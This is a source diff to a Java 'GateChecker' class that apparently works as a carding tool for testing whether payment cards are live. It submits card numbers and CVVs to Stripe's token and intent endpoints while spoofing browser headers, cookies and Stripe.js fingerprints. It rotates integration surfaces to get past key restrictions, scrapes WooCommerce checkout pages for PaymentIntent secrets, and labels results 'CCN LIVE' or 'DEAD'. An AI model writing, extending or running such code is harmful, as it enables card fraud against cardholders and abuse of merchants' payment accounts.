@@ -82,7 +82,7 @@ public class GateChecker {
     }
 
     // ══════════════════════════════════════════════════════════════════
-    //  STRIPE — subtype-aware
+    //  STRIPE — tries multiple surfaces like Node.js (pk_ + sk_ both work)
     // ══════════════════════════════════════════════════════════════════
     private static CheckResult checkStripe(String number, String month, String year,
                                            String cvv, JSONObject s, String subType) throws Exception {
@@ -91,40 +91,178 @@ public class GateChecker {
         String acct = s.optString("connectedAccount", s.optString("stripeAccount", ""));
         String siteUrl = s.optString("siteUrl", "");
 
-        // Stripe server-side tokenization REQUIRES a secret key (sk_live_... or sk_test_...)
-        // Publishable keys (pk_...) can only be used from the browser via Stripe.js
-        if (sk.isEmpty()) {
-            if (!pk.isEmpty()) {
-                return error("Stripe requires a secret key (sk_live_...). Your gate has only a publishable key (pk_...). "
-                    + "Add sk_live_... in gate settings → Keys & Nonces → Stripe Secret Key");
-            }
-            return error("No Stripe keys configured. Add sk_live_... in gate settings → Keys & Nonces → Stripe Secret Key");
-        }
+        if (pk.isEmpty() && sk.isEmpty()) return error("No Stripe keys — add pk_live_... or sk_live_...");
 
-        // ── wc_stripe_confirm_setup_intent: simple PM creation ──
-        if ("wc_stripe_confirm_setup_intent".equals(subType)) {
-            return stripeCreatePM(number, month, year, cvv, sk, acct);
+        // ── wc_stripe_confirm_setup_intent: simple PM creation with sk ──
+        if ("wc_stripe_confirm_setup_intent".equals(subType) && !sk.isEmpty()) {
+            return stripePMWithSecret(number, month, year, cvv, sk, acct);
         }
 
         // ── checkout_session: create session + confirm ──
-        if ("checkout_session".equals(subType) && !siteUrl.isEmpty()) {
+        if ("checkout_session".equals(subType) && !sk.isEmpty() && !siteUrl.isEmpty()) {
             return stripeCheckoutSession(number, month, year, cvv, sk, siteUrl);
         }
 
-        // ── charges / payment_intents / auth / tokenize / standard / 3d_secure / stripe_page_confirm ──
-        // Try WC scrape + PI confirm first (gives richer result with CVV/AVS checks)
+        // ── All other subtypes: try WC scrape + PI confirm first (richest result) ──
         if (!siteUrl.isEmpty()) {
             CheckResult wcResult = stripeWcFlow(number, month, year, cvv, sk, pk, acct, siteUrl, subType);
             if (wcResult != null) return wcResult;
         }
 
-        // Fallback: just create PaymentMethod (proves card is valid)
-        return stripeCreatePM(number, month, year, cvv, sk, acct);
+        // Multi-surface tokenize (matches Node.js stripeTokenize exactly)
+        return stripeTokenizeMultiSurface(number, month, year, cvv, pk, sk, acct, siteUrl);
     }
 
-    // ── Stripe: Create PaymentMethod (requires secretKey) ──
-    private static CheckResult stripeCreatePM(String number, String month, String year,
-                                              String cvv, String sk, String acct) throws Exception {
+    // ── Stripe: Multi-surface tokenize (tries tokens + payment_methods) ──
+    private static CheckResult stripeTokenizeMultiSurface(String number, String month, String year,
+                                                           String cvv, String pk, String sk, String acct,
+                                                           String siteUrl) throws Exception {
+        String name = randomName();
+        String zip = String.format("%05d", rand.nextInt(99999));
+        String refDomain = siteUrl.isEmpty() ? "https://js.stripe.com" : siteUrl;
+        String stripeVer = "11";
+
+        Map<String, String> h = buildStripeHeaders();
+
+        // Surfaces to try — tokens first (pk works), then payment_methods
+        String[][] surfaces = {
+            {"tokens",              "card-element"},
+            {"tokens",              "payment-element"},
+            {"payment_methods",     "split-card-element"},
+            {"payment_methods",     "payment-element"},
+            {"payment_methods",     "card-element"},
+            {"payment_methods",     "link-authentication-element"},
+            {"payment_methods",     "express-checkout-element"},
+        };
+
+        JSONObject lastError = null;
+
+        for (String[] surf : surfaces) {
+            String endpoint = surf[0];
+            String surface = surf[1];
+
+            StringBuilder body = new StringBuilder();
+            if ("tokens".equals(endpoint)) {
+                body.append("card[number]=").append(encode(number));
+                body.append("&card[cvc]=").append(encode(cvv));
+                body.append("&card[exp_month]=").append(encode(month));
+                body.append("&card[exp_year]=").append(encode(year));
+                body.append("&card[name]=").append(encode(name));
+                body.append("&card[address_zip]=").append(encode(zip));
+                body.append("&card[address_country]=US");
+            } else {
+                body.append("type=card");
+                body.append("&card[number]=").append(encode(number));
+                body.append("&card[cvc]=").append(encode(cvv));
+                body.append("&card[exp_month]=").append(encode(month));
+                body.append("&card[exp_year]=").append(encode(year));
+                body.append("&billing_details[name]=").append(encode(name));
+                body.append("&billing_details[address][postal_code]=").append(encode(zip));
+                body.append("&billing_details[address][country]=US");
+            }
+            body.append("&guid=").append(UUID.randomUUID().toString());
+            body.append("&muid=").append(UUID.randomUUID().toString());
+            body.append("&sid=").append(UUID.randomUUID().toString());
+            body.append("&payment_user_agent=stripe.js/").append(stripeVer).append("; stripe-js-v3/").append(stripeVer).append("; ").append(surface);
+            body.append("&referrer=").append(encode(refDomain));
+            body.append("&time_on_page=").append(rand.nextInt(30000) + 5000);
+            body.append("&key=").append(encode(pk));
+
+            String resp = httpPost("https://api.stripe.com/v1/" + endpoint, body.toString(), h);
+            JSONObject json = new JSONObject(resp);
+
+            if (json.has("id")) {
+                // Success — got tok_ or pm_
+                CheckResult result = classifyStripeToken(json);
+                if (result != null) return result;
+            }
+
+            String errMsg = json.optJSONObject("error") != null
+                          ? json.optJSONObject("error").optString("message", "") : "";
+
+            // If NOT an integration surface error, stop trying
+            if (!errMsg.contains("integration surface") && !errMsg.contains("publishable key")) {
+                lastError = json.optJSONObject("error");
+                break;
+            }
+
+            // Integration surface blocked — try next surface
+        }
+
+        // If we got here, all surfaces were blocked or failed
+        if (lastError != null) {
+            String code = lastError.optString("code", "");
+            String msg = lastError.optString("message", "Unknown error");
+            if (isLive(code)) return approved("CCN LIVE | " + fmtDecline(code) + " | " + code, "");
+            if (isDead(code)) return declined("DEAD | " + fmtDecline(code) + " | " + code, "");
+            if (is3DS(code)) return approved("CCN LIVE (3DS) | " + fmtDecline(code) + " | " + code, "");
+            return error("Stripe: " + msg + " [" + code + "]", lastError.toString());
+        }
+
+        // Try sk-based PM creation as final fallback
+        if (!sk.isEmpty()) {
+            return stripePMWithSecret(number, month, year, cvv, sk, acct);
+        }
+
+        return error("All Stripe surfaces blocked. Add sk_live_... in gate settings for reliable tokenization.");
+    }
+
+    // ── Stripe: Build browser-like headers (matches Node.js exactly) ──
+    private static Map<String, String> buildStripeHeaders() {
+        int chrome = 128 + rand.nextInt(10);
+        String ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"
+            + chrome + ".0.0.0 Safari/537.36";
+        String secChUa = "\"Chromium\";v=\"" + chrome + "\", \"Google Chrome\";v=\"" + chrome + "\", \"Not=A?Brand\";v=\"99\"";
+        String gaId = "GA1.1." + (rand.nextInt(900000000) + 100000000) + "." + (System.currentTimeMillis()/1000 - rand.nextInt(86400));
+        String gid = "GA1.1." + (rand.nextInt(900000000) + 100000000) + "." + (System.currentTimeMillis()/1000);
+
+        Map<String, String> h = new HashMap<>();
+        h.put("Content-Type", "application/x-www-form-urlencoded");
+        h.put("Accept", "application/json");
+        h.put("accept-language", "en-US,en;q=0.9");
+        h.put("Origin", "https://js.stripe.com");
+        h.put("Referer", "https://js.stripe.com/");
+        h.put("User-Agent", ua);
+        h.put("sec-ch-ua", secChUa);
+        h.put("sec-ch-ua-mobile", "?0");
+        h.put("sec-ch-ua-platform", "\"Windows\"");
+        h.put("sec-fetch-dest", "empty");
+        h.put("sec-fetch-mode", "cors");
+        h.put("sec-fetch-site", "same-site");
+        h.put("Cookie", "_ga=" + gaId + "; _gid=" + gid);
+        return h;
+    }
+
+    // ── Stripe: Classify token/PM response ──
+    private static CheckResult classifyStripeToken(JSONObject json) {
+        try {
+            if (json.has("id")) {
+                String id = json.getString("id");
+                JSONObject card = json.optJSONObject("card");
+                String brand = card != null ? card.optString("brand", "unknown").toUpperCase() : "UNKNOWN";
+                String funding = card != null ? card.optString("funding", "unknown") : "unknown";
+                String country = card != null ? card.optString("country", "??") : "??";
+                boolean tds = card != null && card.optJSONObject("three_d_secure_usage") != null
+                           && card.optJSONObject("three_d_secure_usage").optBoolean("supported", false);
+                String cvcCheck = card != null && card.optJSONObject("checks") != null
+                                ? card.optJSONObject("checks").optString("cvc_check", "") : "";
+
+                String cvcLabel = "CVV UNCHECKED";
+                if ("pass".equals(cvcCheck)) cvcLabel = "CVV MATCH";
+                else if ("fail".equals(cvcCheck)) cvcLabel = "CVV WRONG";
+
+                return approved(
+                    "CCN LIVE | " + brand + " " + funding + " [" + country + "] | " + id + " | " + (tds ? "3DS" : "NO-3DS") + " | " + cvcLabel,
+                    json.toString()
+                );
+            }
+        } catch (Exception ignored) {}
+        return null;
+    }
+
+    // ── Stripe: PM creation with secret key (fallback) ──
+    private static CheckResult stripePMWithSecret(String number, String month, String year,
+                                                   String cvv, String sk, String acct) throws Exception {
         String name = randomName();
         String email = name.toLowerCase().replace(" ", ".") + "@" + randomDomain();
         String zip = String.format("%05d", rand.nextInt(99999));
@@ -151,74 +289,153 @@ public class GateChecker {
         return classifyStripe(resp);
     }
 
-    // ── Stripe: WC scrape → PI confirm ──
+    // ── Stripe: WC scrape → PI confirm → REAL BANK RESPONSE ──
     private static CheckResult stripeWcFlow(String number, String month, String year,
                                              String cvv, String sk, String pk, String acct,
                                              String siteUrl, String subType) {
         try {
-            String cleanUrl = siteUrl.replaceAll("/+$", "");
-            Map<String, String> pageH = new HashMap<>();
-            pageH.put("User-Agent", randomUA());
-            pageH.put("Accept", "text/html");
-            pageH.put("X-Requested-With", "XMLHttpRequest");
+            String clean = siteUrl.replaceAll("/+$", "");
+            Map<String,String> ph = new HashMap<>();
+            ph.put("User-Agent", randomUA());
+            ph.put("Accept", "text/html,application/xhtml+xml");
 
-            // Try direct setup-intent endpoint first
-            String setupUrl = cleanUrl + "/?wc-ajax=wc_stripe_frontend_request&path=/wc-stripe/v1/setup-intent";
-            Map<String, String> postH = new HashMap<>();
+            // ── Step 1: Try direct setup-intent endpoint ──
+            String clientSecret = null;
+            String piId = null;
+            String intentType = "setup_intents";
+
+            Map<String,String> postH = new HashMap<>();
             postH.put("Content-Type", "application/x-www-form-urlencoded");
             postH.put("Accept", "application/json");
             postH.put("User-Agent", randomUA());
-            postH.put("Origin", cleanUrl);
-            postH.put("Referer", cleanUrl + "/checkout/");
+            postH.put("Origin", clean);
+            postH.put("Referer", clean + "/checkout/");
             postH.put("X-Requested-With", "XMLHttpRequest");
 
-            String setupResp = httpPost(setupUrl, "payment_method=stripe_cc", postH);
-            String cs = extractBetween(setupResp, "\"client_secret\":\"", "\"");
-            if (cs != null && !cs.isEmpty()) {
-                String piId = cs.contains("_secret_") ? cs.split("_secret_")[0] : "";
-                if (!piId.isEmpty()) {
-                    return stripeConfirmIntent(number, month, year, cvv, sk, pk, acct, piId, cs, "setup_intents");
+            String[] setupPaths = {
+                clean + "/?wc-ajax=wc_stripe_frontend_request&path=/wc-stripe/v1/setup-intent",
+                clean + "/?wc-ajax=wc_stripe_frontend_request&path=%2Fwc-stripe%2Fv1%2Fsetup-intent"
+            };
+            for (String url : setupPaths) {
+                try {
+                    String resp = httpPost(url, "payment_method=stripe_cc", postH);
+                    clientSecret = extractBetween(resp, "\"client_secret\":\"", "\"");
+                    if (clientSecret != null && !clientSecret.isEmpty()) {
+                        piId = clientSecret.split("_secret_")[0];
+                        intentType = "setup_intents";
+                        break;
+                    }
+                } catch (Exception ignored) {}
+            }
+
+            // ── Step 2: Try WC Store API → add product to cart → scrape checkout page for PI ──
+            if (clientSecret == null || clientSecret.isEmpty()) {
+                try {
+                    String prodResp = httpGet(clean + "/wp-json/wc/store/v1/products?per_page=5&orderby=price&order=asc", ph);
+                    JSONArray products = new JSONArray(prodResp);
+                    for (int i = 0; i < products.length(); i++) {
+                        JSONObject prod = products.getJSONObject(i);
+                        if (prod.optBoolean("is_in_stock", true) && prod.optBoolean("is_purchasable", true)) {
+                            String pid = prod.getString("id");
+                            // Add to cart
+                            httpGet(clean + "/?add-to-cart=" + pid, ph);
+                            // Go to checkout
+                            String checkResp = httpGet(clean + "/checkout/", ph);
+                            // Extract PI from checkout page
+                            String[] piPatterns = {
+                                "client_secret[\"':]+[\"']([^\"']+)",
+                                "data-client-secret=\"([^\"]+)\"",
+                                "pi_[A-Za-z0-9]+_secret_[A-Za-z0-9]+",
+                                "seti_[A-Za-z0-9]+_secret_[A-Za-z0-9]+"
+                            };
+                            for (String pat : piPatterns) {
+                                String found = extractPattern(checkResp, pat);
+                                if (found != null && !found.isEmpty()) {
+                                    clientSecret = found;
+                                    piId = found.contains("_secret_") ? found.split("_secret_")[0] : "";
+                                    intentType = piId.startsWith("seti_") ? "setup_intents" : "payment_intents";
+                                    break;
+                                }
+                            }
+                            if (clientSecret != null) break;
+                        }
+                    }
+                } catch (Exception e) {
+                    Log.d(TAG, "Store API scrape: " + e.getMessage());
                 }
             }
+
+            // ── Step 3: If we have a PI, confirm it → REAL BANK RESPONSE ──
+            if (clientSecret != null && !clientSecret.isEmpty() && piId != null && !piId.isEmpty()) {
+                return stripeConfirmIntent(number, month, year, cvv, sk, pk, acct, piId, clientSecret, intentType);
+            }
+
         } catch (Exception e) {
-            Log.d(TAG, "WC flow failed: " + e.getMessage());
+            Log.d(TAG, "WC flow: " + e.getMessage());
         }
-        return null; // Caller will fall back to PM creation
+        return null;
     }
 
-    // ── Stripe: Confirm a PaymentIntent/SetupIntent ──
+    // ── Stripe: Confirm a PaymentIntent/SetupIntent → REAL BANK RESPONSE ──
     private static CheckResult stripeConfirmIntent(String number, String month, String year,
-                                                    String cvv, String sk, String pk, String acct,
-                                                    String piId, String clientSecret, String intentType) throws Exception {
+                                                     String cvv, String sk, String pk, String acct,
+                                                     String piId, String clientSecret, String intentType) throws Exception {
         String name = randomName();
         String email = name.toLowerCase().replace(" ", ".") + "@" + randomDomain();
         String zip = String.format("%05d", rand.nextInt(99999));
 
-        // Create token first
+        // Step 1: Create token via browser-like headers (pk works)
         StringBuilder tokBody = new StringBuilder();
         tokBody.append("card[number]=").append(encode(number));
         tokBody.append("&card[cvc]=").append(encode(cvv));
         tokBody.append("&card[exp_month]=").append(encode(month));
         tokBody.append("&card[exp_year]=").append(encode(year));
+        tokBody.append("&card[name]=").append(encode(name));
         tokBody.append("&card[address_zip]=").append(encode(zip));
         tokBody.append("&card[address_country]=US");
+        tokBody.append("&guid=").append(UUID.randomUUID());
+        tokBody.append("&muid=").append(UUID.randomUUID());
+        tokBody.append("&sid=").append(UUID.randomUUID());
+        tokBody.append("&payment_user_agent=stripe.js/11; stripe-js-v3/11; card-element");
+        tokBody.append("&referrer=https://js.stripe.com");
+        tokBody.append("&time_on_page=").append(rand.nextInt(30000) + 5000);
+        if (!pk.isEmpty()) tokBody.append("&key=").append(encode(pk));
 
-        Map<String, String> tokH = new HashMap<>();
-        tokH.put("Content-Type", "application/x-www-form-urlencoded");
-        tokH.put("Accept", "application/json");
-        tokH.put("Origin", "https://js.stripe.com");
-        tokH.put("Referer", "https://js.stripe.com/");
-        tokH.put("User-Agent", randomUA());
+        Map<String, String> tokH = buildStripeHeaders();
         if (!sk.isEmpty()) tokH.put("Authorization", "Bearer " + sk);
 
         String tokResp = httpPost("https://api.stripe.com/v1/tokens", tokBody.toString(), tokH);
         JSONObject tokJson = new JSONObject(tokResp);
         String tokenId = tokJson.optString("id", "");
 
-        // Build confirm body
+        // If token failed, try PM endpoint
+        if (!tokenId.startsWith("tok_")) {
+            StringBuilder pmBody = new StringBuilder();
+            pmBody.append("type=card");
+            pmBody.append("&card[number]=").append(encode(number));
+            pmBody.append("&card[cvc]=").append(encode(cvv));
+            pmBody.append("&card[exp_month]=").append(encode(month));
+            pmBody.append("&card[exp_year]=").append(encode(year));
+            pmBody.append("&billing_details[name]=").append(encode(name));
+            pmBody.append("&billing_details[address][postal_code]=").append(encode(zip));
+            pmBody.append("&billing_details[address][country]=US");
+            pmBody.append("&guid=").append(UUID.randomUUID());
+            pmBody.append("&muid=").append(UUID.randomUUID());
+            pmBody.append("&sid=").append(UUID.randomUUID());
+            pmBody.append("&payment_user_agent=stripe.js/11; stripe-js-v3/11; card-element");
+            pmBody.append("&referrer=https://js.stripe.com");
+            pmBody.append("&time_on_page=").append(rand.nextInt(30000) + 5000);
+            if (!pk.isEmpty()) pmBody.append("&key=").append(encode(pk));
+
+            String pmResp = httpPost("https://api.stripe.com/v1/payment_methods", pmBody.toString(), tokH);
+            JSONObject pmJson = new JSONObject(pmResp);
+            tokenId = pmJson.optString("id", "");
+        }
+
+        // Step 2: Confirm PI with the token → gets REAL BANK RESPONSE
         StringBuilder confBody = new StringBuilder();
         confBody.append("payment_method_data[type]=card");
-        if (tokenId.startsWith("tok_")) {
+        if (tokenId.startsWith("tok_") || tokenId.startsWith("pm_")) {
             confBody.append("&payment_method_data[card][token]=").append(encode(tokenId));
         } else {
             confBody.append("&payment_method_data[card][number]=").append(encode(number));
@@ -237,20 +454,91 @@ public class GateChecker {
         confBody.append("&expand[0]=payment_method");
         confBody.append("&expand[1]=latest_charge.payment_method_details");
 
-        Map<String, String> confH = new HashMap<>();
-        confH.put("Content-Type", "application/x-www-form-urlencoded");
-        confH.put("Accept", "application/json");
-        confH.put("Origin", "https://js.stripe.com");
-        confH.put("Referer", "https://js.stripe.com/");
-        confH.put("User-Agent", randomUA());
+        Map<String, String> confH = buildStripeHeaders();
         if (!sk.isEmpty()) confH.put("Authorization", "Bearer " + sk);
 
         String confResp = httpPost("https://api.stripe.com/v1/" + intentType + "/" + piId + "/confirm",
                                     confBody.toString(), confH);
-        return classifyStripe(confResp);
+        return classifyStripeConfirm(confResp);
     }
 
-    // ── Stripe: Checkout Session ──
+    // ── Stripe: Classify confirm response → REAL BANK RESPONSE ──
+    private static CheckResult classifyStripeConfirm(String resp) {
+        try {
+            JSONObject j = new JSONObject(resp);
+            String status = j.optString("status", "");
+
+            // succeeded → charge confirmed with real bank response
+            if ("succeeded".equals(status)) {
+                JSONObject pm = j.optJSONObject("payment_method");
+                JSONObject card = pm != null ? pm.optJSONObject("card") : null;
+                JSONObject latestCharge = j.optJSONObject("latest_charge");
+                JSONObject chargePM = latestCharge != null ? latestCharge.optJSONObject("payment_method_details") : null;
+                JSONObject chargeCard = chargePM != null ? chargePM.optJSONObject("card") : null;
+                JSONObject checks = card != null ? card.optJSONObject("checks") : null;
+                if (checks == null && chargeCard != null) checks = chargeCard.optJSONObject("checks");
+
+                String brand = card != null ? card.optString("brand", "unknown").toUpperCase() : "UNKNOWN";
+                String funding = card != null ? card.optString("funding", "unknown") : "unknown";
+                String country = card != null ? card.optString("country", "??") : "??";
+                boolean tds = card != null && card.optJSONObject("three_d_secure_usage") != null
+                           && card.optJSONObject("three_d_secure_usage").optBoolean("supported", false);
+                String cvcCheck = checks != null ? checks.optString("cvc_check", "") : "";
+                String avsZip = checks != null ? checks.optString("address_postal_code_check", "") : "";
+                String avsAddr = checks != null ? checks.optString("address_line1_check", "") : "";
+
+                String cvv = "CVV UNCHECKED";
+                if ("pass".equals(cvcCheck)) cvv = "CVV MATCH";
+                else if ("fail".equals(cvcCheck)) cvv = "CVV WRONG";
+
+                String chargeId = "";
+                if (latestCharge != null) chargeId = latestCharge.optString("id", "");
+
+                return approved(
+                    "CVV LIVE | " + brand + " " + funding + " [" + country + "] | "
+                    + (tds ? "3DS" : "NO-3DS") + " | " + cvv
+                    + (avsZip.equals("pass") ? " | AVS-ZIP OK" : "")
+                    + (avsAddr.equals("pass") ? " | AVS-ADDR OK" : "")
+                    + (chargeId.isEmpty() ? "" : " | " + chargeId), resp);
+            }
+
+            // requires_action → 3DS
+            if ("requires_action".equals(status)) {
+                return approved("CCN LIVE (3DS) | Requires authentication | " + j.optString("id", ""), resp);
+            }
+
+            // requires_payment_method → card was declined during confirm
+            if ("requires_payment_method".equals(status)) {
+                JSONObject lpe = j.optJSONObject("last_payment_error");
+                if (lpe != null) {
+                    String errMsg = lpe.optString("message", "Card declined");
+                    String code = lpe.optString("code", "");
+                    String dc = lpe.optString("decline_code", code);
+                    if (isLive(dc)) return approved("CCN LIVE | " + fmtDecline(dc) + " | " + dc, resp);
+                    if (isDead(dc)) return declined("DEAD | " + fmtDecline(dc) + " | " + dc, resp);
+                    if (is3DS(dc)) return approved("CCN LIVE (3DS) | " + fmtDecline(dc) + " | " + dc, resp);
+                    return error("Stripe: " + errMsg + " [" + dc + "]", resp);
+                }
+                return error("Card declined (requires_payment_method)", resp);
+            }
+
+            // error object
+            JSONObject errObj = j.optJSONObject("error");
+            if (errObj != null) {
+                String code = errObj.optString("code", "");
+                String dc = errObj.optString("decline_code", code);
+                String msg = errObj.optString("message", "Error");
+                if ("authentication_required".equals(code) || "invalid_api_key".equals(code))
+                    return error("Invalid Stripe API key", resp);
+                if (isLive(dc)) return approved("CCN LIVE | " + fmtDecline(dc) + " | " + dc, resp);
+                if (isDead(dc)) return declined("DEAD | " + fmtDecline(dc) + " | " + dc, resp);
+                if (is3DS(dc)) return approved("CCN LIVE (3DS) | " + fmtDecline(dc) + " | " + dc, resp);
+                return error("Stripe: " + msg + " [" + dc + "]", resp);
+            }
+
+            return error("Unknown Stripe response", resp);
+        } catch (Exception e) { return error("Parse: " + e.getMessage(), resp); }
+    }
     private static CheckResult stripeCheckoutSession(String number, String month, String year,
                                                       String cvv, String sk, String siteUrl) throws Exception {
         Map<String, String> h = new HashMap<>();
@@ -426,7 +714,7 @@ public class GateChecker {
         String siteUrl = s.optString("siteUrl", "");
         if (siteUrl.isEmpty()) return error("No Shopify site URL configured");
         String sk = s.optString("secretKey", s.optString("stripeSecretKey",""));
-        if (!sk.isEmpty()) return stripeCreatePM(number, month, year, cvv, sk, "");
+        if (!sk.isEmpty()) return stripePMWithSecret(number, month, year, cvv, sk, "");
 
         String scope = extractShopifyScope(siteUrl);
 
@@ -571,7 +859,7 @@ public class GateChecker {
         String cu = s.optString("checkoutUrl", "https://checkout-api.adyen.com/v71/payments");
 
         String sk = s.optString("secretKey", s.optString("stripeSecretKey",""));
-        if (!sk.isEmpty()) return stripeCreatePM(number, month, year, cvv, sk, "");
+        if (!sk.isEmpty()) return stripePMWithSecret(number, month, year, cvv, sk, "");
 
         if ((ck.isEmpty() || ma.isEmpty()) && !siteUrl.isEmpty()) {
             Map<String, String> h = new HashMap<>();
@@ -620,7 +908,7 @@ public class GateChecker {
         if (siteUrl.isEmpty()) return error("No Payeezy site URL configured");
 
         String sk = s.optString("secretKey", s.optString("stripeSecretKey",""));
-        if (!sk.isEmpty()) return stripeCreatePM(number, month, year, cvv, sk, "");
+        if (!sk.isEmpty()) return stripePMWithSecret(number, month, year, cvv, sk, "");
 
         String addPm = s.optString("addPmPath", "/my-account/add-payment-method/");
         if (!addPm.startsWith("http")) addPm = siteUrl + addPm;
